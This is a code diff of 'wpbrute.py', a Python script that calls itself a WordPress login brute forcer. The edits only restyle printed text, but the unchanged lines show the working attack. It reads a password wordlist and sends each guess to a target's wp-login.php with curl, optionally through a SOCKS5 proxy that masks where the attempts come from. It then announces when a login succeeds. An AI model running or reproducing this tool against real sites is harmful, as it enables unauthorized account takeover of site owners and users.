@@ -14,12 +14,12 @@ except:
 	time.sleep(0.6)
 	print "+_________________________________________+"
 	print "|     Wordpress Login Brute Forcer        |"
-	print "|         created by Spoof.               |"
+	print "|         Created By Spoof.               |"
 	print "+_________________________________________+\n"
 	time.sleep(1)
-	print "Usage: python wpbrute.py <target> <username> <wordlist> <proxy>\n"
-	print "Example1: python wpbrute.py http://www.mywebsite.com/ admin wordlist.txt"
-	print "Example2: python wpbrute.py http://www.mywebsite.com/ admin wordlist.txt '127.0.0.1:9050'\n"
+	print "Usage : python wpbrute.py <target> <username> <wordlist> <proxy>\n"
+	print "Example1 : python wpbrute.py http://www.mywebsite.com/ admin wordlist.txt"
+	print "Example2 : python wpbrute.py http://www.mywebsite.com/ admin wordlist.txt '127.0.0.1:9050'\n"
 	sys.exit(1)	
 
 try:
@@ -32,27 +32,27 @@ if "http://" not in target:
 
 print "+_________________________________________+"
 print "|     Wordpress Login Brute Forcer        |"
-print "|         created by Spoof.               |"
+print "|         Created By Spoof.               |"
 print "+_________________________________________+"
 time.sleep(1)
-print "\n ... Calculating number of words in '%s' ... " %wlist
+print "\n Calculating Number Of Words İn '%s' " %wlist
 time.sleep(1.3)
 
 words = open(sys.argv[3],"r").readlines()
 
 time.sleep(0.8)
 
-print "\n [+] Words loaded => ", len(words) 
+print "\n [+] Words Loaded => ", len(words) 
 time.sleep(1.3)
 
 if proxy != "no":
-	print " [+] Proxy loaded => '%s'\n" %proxy
+	print " [+] Proxy Loaded => '%s'\n" %proxy
 
 else:
 	print "\n"
 
 time.sleep(1.1)
-print " ... Bruteforcing Wordpress login ... \n"
+print " Bruteforcing Wordpress Login \n"
 time.sleep(1.5)
 
 
@@ -60,7 +60,7 @@ for word in words:
         word = word.replace('\r','').replace('\n','')
 
 	
-	print ".. Trying => '%s:%s' " %(username,word) 
+	print " Trying => '%s : %s' " %(username,word) 
 
 	if proxy != "no":
 		curl = "curl -s --socks5 %s --url '%s/wp-login.php' -A 'Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1' --data 'log=%s&pwd=%s&wp-submit=Login&redirect_to=%s/wp-admin/&testcookie=1' -o wpbrute_output.html" %(proxy,target,username,word,target)
@@ -79,7 +79,7 @@ for word in words:
 
 	if "wpbrute_output.html" in cfile_read:
 		#print "\n_________________________________________"
-		#print ".. Login not bruteforced :( "
+		#print " Login Not Bruteforced :( "
 		ofile = open("wpbrute_output.html","r")
 		ofile_read = ofile.read()
 		ofile.close()
@@ -92,6 +92,6 @@ for word in words:
 
 	else:
 		print "\n__________________________________________________________"
-		print "..+ Login bruteforced --> '%s:%s'" %(username,word)
+		print " Login Bruteforced --> '%s : %s'" %(username,word)
 		print "__________________________________________________________\n"
 		sys.exit(1)
